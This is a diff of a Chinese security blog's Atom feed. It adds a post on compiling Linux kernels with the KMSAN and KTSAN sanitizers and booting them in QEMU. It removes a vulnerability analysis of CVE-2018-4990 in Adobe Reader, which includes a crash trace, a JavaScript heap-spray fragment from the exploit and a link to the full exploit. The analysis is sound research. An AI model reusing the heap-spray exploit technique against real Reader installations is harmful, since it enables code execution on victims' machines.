@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://o0xmuhe.me/"/>
-  <updated>2019-10-17T08:59:17.759Z</updated>
+  <updated>2019-10-24T02:43:10.466Z</updated>
   <id>http://o0xmuhe.me/</id>
   
   <author>
@@ -14,6 +14,60 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux Kernel 编译踩坑</title>
+    <link href="http://o0xmuhe.me/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/"/>
+    <id>http://o0xmuhe.me/2019/10/24/Linux-Kernel-编译踩坑/</id>
+    <published>2019-10-24T02:42:04.000Z</published>
+    <updated>2019-10-24T02:43:10.466Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="env-config"><a href="#env-config" class="headerlink" title="env config"></a>env config</h2><p><code>ubuntu 18.04 amd64</code></p>
+<a id="more"></a>
+<h3 id="gcc-8"><a href="#gcc-8" class="headerlink" title="gcc-8"></a>gcc-8</h3><p>works on ubuntu 16.04 and 18.04</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/<span class="built_in">test</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gcc-8 g++-8</span><br><span class="line">gcc-8 --version</span><br></pre></td></tr></table></figure>
+<h3 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R=348261</span><br><span class="line">svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/llvm/trunk llvm</span><br><span class="line"><span class="built_in">cd</span> llvm</span><br><span class="line">(<span class="built_in">cd</span> tools &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/cfe/trunk clang)</span><br><span class="line">(<span class="built_in">cd</span> projects &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt)</span><br><span class="line">mkdir llvm_cmake_build &amp;&amp; <span class="built_in">cd</span> llvm_cmake_build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON ../</span><br><span class="line">make -j64 clang</span><br><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br></pre></td></tr></table></figure>
+<p>文档里<code>-j64</code>真的奢华…</p>
+<h3 id="qemu-kvm"><a href="#qemu-kvm" class="headerlink" title="qemu kvm"></a>qemu kvm</h3><p>这部分推荐手动编译最新版本/较新版本，直接apt安装的版本有点老，后面可能有影响。</p>
+<p>基本没啥坑，就是耗时耗力 :(</p>
+<h2 id="build-kernel"><a href="#build-kernel" class="headerlink" title="build kernel"></a>build kernel</h2><h3 id="mainline"><a href="#mainline" class="headerlink" title="mainline"></a>mainline</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure>
+<h3 id="linux-next"><a href="#linux-next" class="headerlink" title="linux-next"></a>linux-next</h3><p>一样的编译过程，next只是代码比较激进的版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure>
+<h3 id="kmsan"><a href="#kmsan" class="headerlink" title="kmsan"></a>kmsan</h3><p>跟着readme走就行了</p>
+<p>遇到一个坑点，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br><span class="line">...</span><br><span class="line">make CC=<span class="variable">$KMSAN_CLANG_PATH</span> -j64 -k 2&gt;&amp;1 | tee build.log</span><br></pre></td></tr></table></figure>
+<p>直接这么编译有问题，试了几次都不行，提示说编译器不支持xxxx这类问题。<br>最后我尝试了:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/path/to/clang</span><br></pre></td></tr></table></figure>
+<p>之后直接编译就没问题了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure>
+<h3 id="ktsan"><a href="#ktsan" class="headerlink" title="ktsan"></a>ktsan</h3><p>编译没啥坑，就是注意<code>.config</code>文件别乱改。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/ktsan.git</span><br><span class="line"><span class="built_in">cd</span> ktsan/</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line">scripts/config <span class="_">-e</span> KTSAN <span class="_">-e</span> SLAB <span class="_">-d</span> SLUB <span class="_">-e</span> DEBUG_INFO</span><br><span class="line">yes <span class="string">''</span> | make oldconfig</span><br><span class="line">make -j2 LOCALVERSION=-tsan</span><br></pre></td></tr></table></figure>
+<h2 id="run-kernel"><a href="#run-kernel" class="headerlink" title="run kernel"></a>run kernel</h2><p>创建文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">IMG=qemu-image.img</span><br><span class="line">DIR=mount-point.dir</span><br><span class="line">qemu-img create <span class="variable">$IMG</span> 10g</span><br><span class="line">mkfs.ext2 <span class="variable">$IMG</span></span><br><span class="line">mkdir <span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$IMG</span> <span class="variable">$DIR</span></span><br><span class="line">sudo debootstrap --arch amd64 jessie <span class="variable">$DIR</span></span><br><span class="line">sudo umount <span class="variable">$DIR</span></span><br><span class="line">rmdir <span class="variable">$DIR</span></span><br></pre></td></tr></table></figure>
+<p>这样直接创建不行，需要在取消挂载之前设置好新文件系统里的用户名密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot mount-point.dir /bin/bash</span><br></pre></td></tr></table></figure>
+<p>进去之后，直接修改root密码就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># passwd root</span></span><br></pre></td></tr></table></figure>
+<p>其实还能做其他的设置，但是只是为了验证加载的内核是否正常，只需要登录进去就ok了。</p>
+<p>基本上都能用这个命令起来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-m 2G -smp 2 \</span><br><span class="line">-hda qemu-image.img  \</span><br><span class="line">-kernel linux-5.4-rc4/arch/x86/boot/bzImage \</span><br><span class="line">-append <span class="string">"debug root=/dev/sda  console=ttyS0"</span> \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>
+<p>除了ktsan</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -drive file=qemu-image.img,index=0 \</span><br><span class="line">  -m 24G -smp 4 \</span><br><span class="line">  -net user,hostfwd=tcp::10022-:22 -net nic \</span><br><span class="line">  -nographic \</span><br><span class="line">  -kernel arch/x86/boot/bzImage -append <span class="string">"console=ttyS0 root=/dev/sda rw debug earlyprintk=serial slub_debug=QUZ"</span>\</span><br><span class="line">  -enable-kvm -cpu host</span><br></pre></td></tr></table></figure>
+<p>我用它wiki里的命令无法成功启动，各种panic，或者就是文件系统挂载出问题，我换了我原本的ext2的img之后多试几次，就能正常工作了。</p>
+<p>我这里给的是<code>24G</code>内存。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/google/ktsan/wiki" target="_blank" rel="noopener">ktsan</a><br><a href="https://github.com/google/kmsan" target="_blank" rel="noopener">kmsan</a><br><a href="https://www.kernel.org" target="_blank" rel="noopener">linux-kernel</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;env-config&quot;&gt;&lt;a href=&quot;#env-config&quot; class=&quot;headerlink&quot; title=&quot;env config&quot;&gt;&lt;/a&gt;env config&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ubuntu 18.04 amd64&lt;/code&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Linux" scheme="http://o0xmuhe.me/tags/Linux/"/>
+    
+  </entry>
   
   <entry>
     <title>Debug macOS Kernel</title>
@@ -884,57 +938,6 @@
       <category term="PoC" scheme="http://o0xmuhe.me/tags/PoC/"/>
     
       <category term="Adobe Reader" scheme="http://o0xmuhe.me/tags/Adobe-Reader/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2018-4990 analysis</title>
-    <link href="http://o0xmuhe.me/2019/04/06/CVE-2018-4990-analysis/"/>
-    <id>http://o0xmuhe.me/2019/04/06/CVE-2018-4990-analysis/</id>
-    <published>2019-04-06T13:39:01.000Z</published>
-    <updated>2019-04-06T13:54:22.054Z</updated>
-    
-    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jp2k的越界读，转换2-free的利用。</span><br></pre></td></tr></table></figure>
-<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p>Win7 x86<br>Adobe Acrobat Reader 2018.011.20036</p>
-<a id="more"></a>
-<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>一张特殊构造过的JP2K图片<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914054830.jpg" alt="-w650"></p>
-<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914250745.jpg" alt="-w640"></p>
-<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914374768.jpg" alt="-w641"></p>
-<p>大小和内容都是经过构造的，这里先触发一下漏洞，分析漏洞成因。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开pageheap后，windbg调试。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax=00000000 ebx=00000000 ecx=6bf58598 edx=00000000 esi=00000000 edi=00000000</span><br><span class="line">eip=6bf2ba58 esp=00529b04 ebp=00529b20 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">verifier!VerifierStopMessage+0x1f8:</span><br><span class="line">6bf2ba58 cc              int     3</span><br><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00529b20 6bf29ee0 verifier!VerifierStopMessage+0x1f8</span><br><span class="line">00529b84 6bf26f11 verifier!VerifierDisableFaultInjectionExclusionRange+0x3f90</span><br><span class="line">0052a16c 6bf26f95 verifier!VerifierDisableFaultInjectionExclusionRange+0xfc1</span><br><span class="line">0052a190 6bf27240 verifier!VerifierDisableFaultInjectionExclusionRange+0x1045</span><br><span class="line">0052a1ac 6bf29080 verifier!VerifierDisableFaultInjectionExclusionRange+0x12f0</span><br><span class="line">0052a1c8 776b65f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3130</span><br><span class="line">0052a210 7767a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0052a304 776465a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0052a324 7733c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0052a338 69feecfa kernel32!HeapFree+0x14</span><br><span class="line">0052a34c 64290574 MSVCR120!free+0x1a</span><br><span class="line">0052a46c 642a6482 JP2KLib!JP2KCopyRect+0xbae6</span><br><span class="line">0052a4c4 65f06a24 JP2KLib!JP2KImageInitDecoderEx+0x24</span><br><span class="line">0052a54c 65f083be AcroRd32_65910000!AX_PDXlateToHostEx+0x2615e5</span><br><span class="line">0052a5ac 65efd459 AcroRd32_65910000!AX_PDXlateToHostEx+0x262f7f</span><br><span class="line">0052a5b8 65f06368 AcroRd32_65910000!AX_PDXlateToHostEx+0x25801a</span><br></pre></td></tr></table></figure>
-<p>根据call stack往前找，找漏洞触发的点，着重分析JP2KLib中两个调用。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">JP2KImageInitDecoderEx</span><span class="params">(Concurrency::details::SchedulerBase *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_1004F3BD(a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543015735567.jpg" alt="-w848"></p>
-<p>对应的汇编<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543020367641.jpg" alt="-w375"></p>
-<p>调试一下这里：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543023168418.jpg" alt="-w1485"></p>
-<p>可以发现，这个循环，每次读取8字节，循环次数<code>0xff</code>次。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> idx = <span class="number">0</span>; idx &lt; <span class="number">0xff</span>; idx++)&#123;</span><br><span class="line">    <span class="comment">//do read work...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>最后一次循环的时候，idx是<code>0xfe</code>，此时读取到 <code>0xfe * 4</code>。<br>调试发现，<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543026333699.jpg" alt="-w426"></p>
-<p>这个buffer size只有<code>0xfd * 4 = 0x3f4</code>这么大，所以导致越界读的发生。</p>
-<h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>这个利用可以说十分的巧妙，利用js布局内存，把越界读转换成了<code>Double free</code>完成利用。</p>
-<p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/CVE-2018-4990" target="_blank" rel="noopener">完整Exploit链接</a></p>
-<p>因为需要提前做内存布局，不能直接就触发漏洞，所以需要利用js再布局内存完成后，主动地触发漏洞，这里的做法和p2o 2017，360安全团队打Reader的利用套路一样，把图片放嵌入<code>button field</code>,并设置按钮不可显示，在布局完成后，设置按钮属性可显，然后触发漏洞。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a         = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x3000</span>);</span><br><span class="line"><span class="keyword">var</span> spraynum  = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">var</span> sprayarr  = <span class="keyword">new</span> <span class="built_in">Array</span>(spraynum);</span><br><span class="line"><span class="keyword">var</span> spraylen  = <span class="number">0x10000</span><span class="number">-24</span>;</span><br><span class="line"><span class="keyword">var</span> spraybase = <span class="number">0x0d0e0048</span>;</span><br><span class="line"><span class="keyword">var</span> spraypos  = <span class="number">0x0d0f0058</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force allocations to prepare the heap for the oob read</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1++)&#123;</span><br><span class="line">    a[i1] = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">252</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// these will be freed</span></span><br><span class="line">    a[i1][<span class="number">249</span>] = spraybase;</span><br><span class="line">    a[i1][<span class="number">250</span>] = spraybase + <span class="number">0x10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; spraynum; i1++)&#123;</span><br><span class="line">    sprayarr[i1] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(spraylen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// make holes so the oob read chunk lands here</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1 = i1 + <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">delete</span> a[i1];</span><br><span class="line">    a[i1] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>内存布局的话，利用中使用了ArrayBuffer，利用堆喷，分配大量连续的Arraybuffer，并<code>make hole</code>，使得图片解析的时候正好分配到内存布局的<code>hole</code>;随后触发越界读，把漏洞转换成double free去利用。</p>
-<p>​    利用的后面通过sprayarr2的赋值抢占释放的0x20000内存，一旦抢占成功，sprayarr中之前被释放的elment的长度就会被修改为0x20000；最后通过之前内存布局后精准的内存释放(idx 249,250)获取一个超长element，以实现全局内存读写，再通过全局内存读写，伪造bookmarkRoot的对象实现任意代码执行。</p>
-<h2 id="遇到的问题-TODO"><a href="#遇到的问题-TODO" class="headerlink" title="遇到的问题(TODO)"></a>遇到的问题(TODO)</h2><p>win7上这些分析没啥问题，一步步调试，内存布局也没什么问题；在win10上内存布局出现了不连续、失效等情况，这部分<code>TODO</code>，需要解决。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://srcincite.io/blog/2018/05/21/adobe-me-and-a-double-free.html" target="_blank" rel="noopener">adobe-me-and-a-double-free</a></p>
-<p><a href="https://bbs.pediy.com/thread-250449.htm" target="_blank" rel="noopener">对CVE-2018-4990漏洞的补充分析</a></p>
-<p><a href="https://ti.360.net/blog/articles/analysis-of-cve-2018-4990/" target="_blank" rel="noopener"><strong>CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析</strong></a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;jp2k的越界读，转换2-free的利用。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&quot;环境信息&quot;&gt;&lt;a href=&quot;#环境信息&quot; class=&quot;headerlink&quot; title=&quot;环境信息&quot;&gt;&lt;/a&gt;环境信息&lt;/h2&gt;&lt;p&gt;Win7 x86&lt;br&gt;Adobe Acrobat Reader 2018.011.20036&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
-      <category term="Adobe Acrobat Reader" scheme="http://o0xmuhe.me/tags/Adobe-Acrobat-Reader/"/>
     
   </entry>
   
